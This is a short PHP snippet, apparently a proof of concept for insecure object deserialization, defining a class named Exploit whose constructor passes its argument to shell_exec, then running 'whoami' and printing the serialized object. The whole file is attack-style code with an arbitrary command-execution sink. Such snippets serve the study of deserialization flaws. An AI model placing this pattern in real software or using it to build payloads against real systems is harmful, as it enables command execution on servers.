<?php
class Exploit{
	public $cmd;
	function __construct($cmd){
		
		echo shell_exec($cmd);
	}
	
}
$a = new Exploit("whoami");
echo serialize($a);